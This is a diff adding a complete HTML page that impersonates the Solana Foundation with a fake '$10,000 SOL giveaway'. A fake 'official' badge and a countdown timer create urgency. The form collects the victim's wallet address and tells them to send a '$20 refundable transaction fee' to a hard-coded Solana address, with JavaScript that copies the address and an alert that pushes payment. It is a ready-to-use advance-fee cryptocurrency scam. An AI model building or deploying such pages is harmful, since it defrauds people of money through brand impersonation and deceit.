@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Congratulations! You Won $10,000 SOL Giveaway | Solana Foundation</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        :root {
+            --solana-purple: #9945FF;
+            --solana-green: #14F195;
+            --solana-blue: #00C2FF;
+            --dark-bg: #0F0F1B;
+            --card-bg: #1A1A2E;
+            --text-light: #FFFFFF;
+            --text-muted: #A0A0C0;
+        }
+
+        body {
+            background: linear-gradient(135deg, var(--dark-bg) 0%, #1D1B38 100%);
+            color: var(--text-light);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        /* Solana Header Styles */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 1rem 2rem;
+            background: rgba(10, 10, 20, 0.8);
+            border-bottom: 1px solid rgba(153, 69, 255, 0.2);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+        }
+
+        .logo img {
+            height: 40px;
+        }
+
+        .logo h1 {
+            background: linear-gradient(to right, var(--solana-purple), var(--solana-green));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            font-weight: 700;
+            font-size: 1.8rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            text-align: center;
+            padding: 4rem 1rem;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%230F0F1B"/><path d="M0 50 Q 25 30, 50 50 T 100 50 L100 100 L0 100 Z" fill="%239945FF" opacity="0.1"/></svg>');
+            background-size: cover;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(153, 69, 255, 0.1) 0%, transparent 70%);
+            z-index: -1;
+        }
+
+        .confetti {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 20px;
+            background: var(--solana-purple);
+            top: 0;
+            opacity: 0;
+        }
+
+        .hero-content {
+            max-width: 800px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 2;
+        }
+
+        .tag {
+            display: inline-block;
+            background: linear-gradient(to right, var(--solana-purple), var(--solana-blue));
+            padding: 0.5rem 1.5rem;
+            border-radius: 50px;
+            font-weight: 600;
+            font-size: 0.9rem;
+            margin-bottom: 1rem;
+            letter-spacing: 1px;
+        }
+
+        h2 {
+            font-size: 3.5rem;
+            margin-bottom: 1.5rem;
+            background: linear-gradient(to right, var(--solana-green), var(--solana-blue));
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            line-height: 1.1;
+        }
+
+        .hero p {
+            font-size: 1.2rem;
+            color: var(--text-muted);
+            max-width: 700px;
+            margin: 0 auto 2rem;
+            line-height: 1.6;
+        }
+
+        /* Claim Section */
+        .claim-section {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 3rem;
+            max-width: 800px;
+            margin: -60px auto 4rem;
+            position: relative;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            border: 1px solid rgba(153, 69, 255, 0.3);
+        }
+
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 2.5rem;
+            position: relative;
+        }
+
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 24px;
+            left: 50px;
+            right: 50px;
+            height: 4px;
+            background: linear-gradient(to right, var(--solana-purple), var(--solana-green));
+            z-index: 1;
+        }
+
+        .step {
+            text-align: center;
+            z-index: 2;
+            position: relative;
+            flex: 1;
+        }
+
+        .step-number {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, var(--solana-purple), #7A3FFF);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 1rem;
+            font-weight: bold;
+            font-size: 1.2rem;
+            color: white;
+            box-shadow: 0 5px 15px rgba(153, 69, 255, 0.4);
+        }
+
+        .step.active .step-number {
+            background: linear-gradient(135deg, var(--solana-green), #0FD882);
+        }
+
+        .step-text {
+            color: var(--text-muted);
+            font-size: 0.9rem;
+        }
+
+        .step.active .step-text {
+            color: var(--solana-green);
+            font-weight: 600;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 0.5rem;
+            font-weight: 600;
+            color: var(--text-light);
+        }
+
+        .input-with-icon {
+            position: relative;
+        }
+
+        input {
+            width: 100%;
+            padding: 1rem 1rem 1rem 3rem;
+            border-radius: 12px;
+            border: 2px solid rgba(153, 69, 255, 0.3);
+            background: rgba(10, 10, 20, 0.6);
+            color: var(--text-light);
+            font-size: 1rem;
+            transition: all 0.3s ease;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--solana-purple);
+            box-shadow: 0 0 0 3px rgba(153, 69, 255, 0.3);
+        }
+
+        .input-icon {
+            position: absolute;
+            left: 1rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--solana-purple);
+            font-size: 1.2rem;
+        }
+
+        .fee-address {
+            background: rgba(20, 241, 149, 0.1);
+            border: 1px solid rgba(20, 241, 149, 0.3);
+            border-radius: 12px;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            font-family: monospace;
+            font-size: 0.9rem;
+            word-break: break-all;
+            position: relative;
+        }
+
+        .copy-btn {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background: rgba(20, 241, 149, 0.2);
+            border: none;
+            color: var(--solana-green);
+            padding: 0.3rem 0.7rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .copy-btn:hover {
+            background: rgba(20, 241, 149, 0.3);
+        }
+
+        .note {
+            background: rgba(255, 255, 255, 0.05);
+            border-left: 4px solid var(--solana-blue);
+            padding: 1rem;
+            border-radius: 0 8px 8px 0;
+            margin: 1.5rem 0;
+            font-size: 0.9rem;
+        }
+
+        .btn {
+            display: inline-block;
+            background: linear-gradient(to right, var(--solana-purple), var(--solana-green));
+            color: white;
+            padding: 1rem 2.5rem;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 1.1rem;
+            text-align: center;
+            cursor: pointer;
+            border: none;
+            transition: all 0.3s ease;
+            width: 100%;
+            margin-top: 1rem;
+        }
+
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(153, 69, 255, 0.3);
+        }
+
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 1rem;
+            margin: 2rem 0;
+        }
+
+        .timer-item {
+            background: rgba(20, 241, 149, 0.1);
+            border-radius: 10px;
+            padding: 0.5rem 1rem;
+            min-width: 70px;
+            text-align: center;
+        }
+
+        .timer-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--solana-green);
+        }
+
+        .timer-label {
+            font-size: 0.8rem;
+            color: var(--text-muted);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        footer {
+            text-align: center;
+            padding: 2rem;
+            color: var(--text-muted);
+            font-size: 0.9rem;
+            border-top: 1px solid rgba(153, 69, 255, 0.1);
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 1.5rem;
+            margin-top: 1rem;
+        }
+
+        .social-links a {
+            color: var(--text-muted);
+            font-size: 1.2rem;
+            transition: all 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: var(--solana-purple);
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            h2 {
+                font-size: 2.5rem;
+            }
+            
+            .steps {
+                flex-direction: column;
+                gap: 2rem;
+            }
+            
+            .steps::before {
+                display: none;
+            }
+            
+            .claim-section {
+                padding: 2rem;
+                margin-top: -30px;
+            }
+            
+            .hero {
+                padding: 3rem 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <svg width="40" height="40" viewBox="0 0 100 100" fill="none">
+                <path d="M50 100C77.6142 100 100 77.6142 100 50C100 22.3858 77.6142 0 50 0C22.3858 0 0 22.3858 0 50C0 77.6142 22.3858 100 50 100Z" fill="black"/>
+                <path d="M64.5711 47.0004C64.5711 39.0004 58.1429 33.0004 50.0001 33.0004C41.8573 33.0004 35.429 39.0004 35.429 47.0004C35.429 55.0004 41.8573 61.0004 50.0001 61.0004C58.1429 61.0004 64.5711 55.0004 64.5711 47.0004ZM23.0001 47.0004C23.0001 28.0004 35.0001 15.0004 50.0001 15.0004C65.0001 15.0004 77.0001 28.0004 77.0001 47.0004C77.0001 66.0004 65.0001 79.0004 50.0001 79.0004C35.0001 79.0004 23.0001 66.0004 23.0001 47.0004Z" fill="url(#paint0_linear)"/>
+                <defs>
+                    <linearGradient id="paint0_linear" x1="50" y1="15" x2="50" y2="79" gradientUnits="userSpaceOnUse">
+                        <stop stop-color="#00FFA3"/>
+                        <stop offset="1" stop-color="#DC1FFF"/>
+                    </linearGradient>
+                </defs>
+            </svg>
+            <h1>Solana Foundation</h1>
+        </div>
+        <div class="official-tag">
+            <span class="tag">OFFICIAL GIVEAWAY PORTAL</span>
+        </div>
+    </header>
+
+    <section class="hero">
+        <div class="confetti" id="confetti-container"></div>
+        <div class="hero-content">
+            <span class="tag">CONGRATULATIONS!</span>
+            <h2>You've Won $10,000 in SOL!</h2>
+            <p>Your participation in the Solana Foundation Quarterly Giveaway has been selected as the grand prize winner! Complete the verification process below to claim your prize.</p>
+            
+            <div class="timer">
+                <div class="timer-item">
+                    <div class="timer-value" id="hours">24</div>
+                    <div class="timer-label">Hours</div>
+                </div>
+                <div class="timer-item">
+                    <div class="timer-value" id="minutes">59</div>
+                    <div class="timer-label">Minutes</div>
+                </div>
+                <div class="timer-item">
+                    <div class="timer-value" id="seconds">59</div>
+                    <div class="timer-label">Seconds</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <section class="claim-section">
+        <div class="steps">
+            <div class="step active">
+                <div class="step-number">1</div>
+                <div class="step-text">Wallet Details</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div class="step-text">Pay Fee</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div class="step-text">Receive Prize</div>
+            </div>
+        </div>
+
+        <form id="claim-form">
+            <div class="form-group">
+                <label for="wallet-address">Your Solana Wallet Address</label>
+                <div class="input-with-icon">
+                    <i class="fas fa-wallet input-icon"></i>
+                    <input type="text" id="wallet-address" placeholder="e.g. 7a4r8b...c9d2f" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>Transaction Fee Address</label>
+                <div class="fee-address" id="fee-address">
+                    HJhtEGSgBN7fnfnKLgiTH8EAB3eL5QofXfWg3FHWyA2g
+                    <button type="button" class="copy-btn" onclick="copyAddress()">
+                        <i class="fas fa-copy"></i> Copy
+                    </button>
+                </div>
+                <p class="note">
+                    <strong>Important:</strong> To prevent spam and verify your wallet, a $20 transaction fee must be sent to the address above. This fee will be refunded with your prize. The entire process is automated and takes less than 5 minutes to complete.
+                </p>
+            </div>
+            
+            <button type="submit" class="btn">Continue to Payment Verification</button>
+        </form>
+    </section>
+
+    <footer>
+        <p>© 2023 Solana Foundation. All rights reserved.</p>
+        <p>This is an official promotion by the Solana Foundation. Beware of scams and fake websites.</p>
+        <div class="social-links">
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-discord"></i></a>
+            <a href="#"><i class="fab fa-telegram"></i></a>
+            <a href="#"><i class="fab fa-github"></i></a>
+        </div>
+    </footer>
+
+    <script>
+        // Create confetti effect
+        function createConfetti() {
+            const container = document.getElementById('confetti-container');
+            const colors = ['#9945FF', '#14F195', '#00C2FF', '#FFFFFF'];
+            
+            for (let i = 0; i < 150; i++) {
+                const confetti = document.createElement('div');
+                confetti.className = 'confetti-piece';
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
+                confetti.style.opacity = Math.random() * 0.7 + 0.3;
+                confetti.style.transform = `rotate(${Math.random() * 360}deg)`;
+                
+                container.appendChild(confetti);
+                
+                // Animation
+                const animation = confetti.animate([
+                    { transform: 'translate3d(0,0,0)', opacity: 0 },
+                    { transform: `translate3d(${Math.random() * 200 - 100}px, ${window.innerHeight}px, 0) rotate(${Math.random() * 360}deg)`, opacity: 1 }
+                ], {
+                    duration: Math.random() * 3000 + 2000,
+                    easing: 'cubic-bezier(0.1, 0.8, 0.2, 1)'
+                });
+                
+                animation.onfinish = () => {
+                    confetti.remove();
+                };
+            }
+        }
+        
+        // Timer countdown
+        function updateTimer() {
+            const hoursElem = document.getElementById('hours');
+            const minutesElem = document.getElementById('minutes');
+            const secondsElem = document.getElementById('seconds');
+            
+            let hours = parseInt(hoursElem.textContent);
+            let minutes = parseInt(minutesElem.textContent);
+            let seconds = parseInt(secondsElem.textContent);
+            
+            seconds--;
+            
+            if (seconds < 0) {
+                seconds = 59;
+                minutes--;
+                
+                if (minutes < 0) {
+                    minutes = 59;
+                    hours--;
+                    
+                    if (hours < 0) {
+                        hours = 0;
+                        minutes = 0;
+                        seconds = 0;
+                        clearInterval(timerInterval);
+                        return;
+                    }
+                }
+            }
+            
+            hoursElem.textContent = hours.toString().padStart(2, '0');
+            minutesElem.textContent = minutes.toString().padStart(2, '0');
+            secondsElem.textContent = seconds.toString().padStart(2, '0');
+        }
+        
+        // Copy address to clipboard
+        function copyAddress() {
+            const address = "HJhtEGSgBN7fnfnKLgiTH8EAB3eL5QofXfWg3FHWyA2g";
+            navigator.clipboard.writeText(address).then(() => {
+                const copyBtn = document.querySelector('.copy-btn');
+                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
+                setTimeout(() => {
+                    copyBtn.innerHTML = '<i class="fas fa-copy"></i> Copy';
+                }, 2000);
+            });
+        }
+        
+        // Form submission
+        document.getElementById('claim-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const walletAddress = document.getElementById('wallet-address').value;
+            
+            if (walletAddress.trim() === '') {
+                alert('Please enter your Solana wallet address');
+                return;
+            }
+            
+            alert('Please send the $20 transaction fee to the provided address to complete your claim. After payment, your $10,000 SOL prize will be automatically transferred to your wallet.');
+        });
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            createConfetti();
+            setInterval(createConfetti, 5000);
+            
+            const timerInterval = setInterval(updateTimer, 1000);
+        });
+    </script>
+</body>
+</html>
